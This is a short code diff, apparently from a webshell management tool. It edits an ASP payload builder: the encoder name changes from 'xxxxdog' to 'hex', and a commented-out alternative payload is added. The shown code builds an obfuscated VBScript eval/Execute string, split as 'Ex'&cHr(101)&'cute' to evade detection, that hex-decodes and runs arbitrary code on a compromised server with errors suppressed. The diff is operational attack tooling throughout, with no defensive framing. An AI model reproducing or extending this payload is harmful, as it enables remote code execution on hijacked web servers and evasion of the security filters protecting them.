@@ -34,7 +34,7 @@ class ASP extends Base {
    * @return {array} 编码器列表
    */
   get encoders() {
-    return ['xxxxdog'];
+    return ['hex'];
   }
 
   /**
@@ -55,7 +55,7 @@ class ASP extends Base {
 
     // 组合完整的代码
     data['_'] = `eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""${tag_s}""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""${hexCode}"""")):Response.Write(""""${tag_e}""""):Response.End"")")`;
-
+    // data['_'] = `On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:bd=bd&chr("&H"&c):Else:bd=bd&chr("&H"&c&Mid(s,i+2,2)):i=i+2:End If:Next:End Function:Response.Write("${tag_s}"):${data['_']}:Response.Write("${tag_e}"):Response.End`;
     // 使用编码器进行处理并返回
     return this.encodeComplete(tag_s, tag_e, data);
   }
